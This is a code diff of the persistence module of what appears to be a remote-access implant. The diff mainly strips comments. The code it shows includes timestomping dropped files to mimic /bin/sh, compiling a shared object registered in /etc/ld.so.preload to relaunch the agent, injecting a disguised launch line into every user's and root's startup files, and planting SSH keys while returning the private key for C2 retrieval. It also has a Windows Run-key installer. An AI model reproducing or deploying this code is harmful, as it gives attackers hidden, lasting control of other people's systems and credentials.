@@ -59,7 +59,6 @@ class Persistence:
             with open(path, "w") as f:
                 f.write(content)
             os.chmod(path, mode)
-            # Mask timestamp to look like a system file
             os.utime(path, (os.path.getatime("/bin/sh"), os.path.getmtime("/bin/sh")))
             return True
         except Exception:
@@ -167,7 +166,6 @@ WantedBy=multi-user.target
         name = Persistence._random_name()
         so_path = f"/usr/lib/{name}.so"
 
-        # Minimal C payload that forks and execs the agent
         c_code = f"""
 #include <stdlib.h>
 #include <unistd.h>
@@ -187,8 +185,6 @@ void init(void) {{
 }}
 """
         try:
-            # Try to compile; fall back to writing a .so path into ld.so.preload
-            # First check if gcc exists
             gcc_check = subprocess.run(
                 ["which", "gcc"], capture_output=True, timeout=5
             )
@@ -204,13 +200,11 @@ void init(void) {{
                 os.unlink(tmp_c.name)
 
                 if os.path.exists(so_path):
-                    # Activate via ld.so.preload
                     with open("/etc/ld.so.preload", "a") as f:
                         f.write(f"{so_path}\n")
                     os.chmod(so_path, 0o755)
                     return {"status": True, "detail": f"LD_PRELOAD .so installed at {so_path}"}
 
-            # Fallback: write to ld.so.preload with a known-good .so path (less reliable)
             return {"status": False, "detail": "gcc not available for LD_PRELOAD compilation"}
         except Exception as e:
             return {"status": False, "detail": f"LD_PRELOAD error: {e}"}
@@ -222,12 +216,10 @@ void init(void) {{
         payload = f"\n# System diagnostic helper\n({sys.executable} {agent} &) >/dev/null 2>&1 &\n"
 
         home_dirs = []
-        # Check /home
         try:
             home_dirs = [os.path.join("/home", d) for d in os.listdir("/home")]
         except Exception:
             pass
-        # Root
         home_dirs.append("/root")
 
         installed = []
@@ -253,7 +245,6 @@ void init(void) {{
             return {"status": False, "detail": "SSH key install only on Unix"}
 
         if not public_key:
-            # Generate a new keypair on the fly and return the private key via detail
             try:
                 keygen = subprocess.run(
                     ["ssh-keygen", "-t", "ed25519", "-f", "/tmp/.raphael_key", "-N", "", "-q"],
@@ -283,7 +274,6 @@ void init(void) {{
 
             detail = "SSH public key installed"
             if privkey:
-                # Base64 encode the private key so it can be retrieved via C2
                 detail += f" | PRIVATE_KEY_B64:{base64.b64encode(privkey.encode()).decode()}"
             return {"status": True, "detail": detail}
         except Exception as e:
@@ -295,7 +285,7 @@ void init(void) {{
 
     @staticmethod
     def install_registry_run() -> dict:
-        """Install agent in HKCU\Software\Microsoft\Windows\CurrentVersion\Run."""
+        """Install agent in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run."""
         if not Persistence.IS_WINDOWS:
             return {"status": False, "detail": "Not Windows"}
 
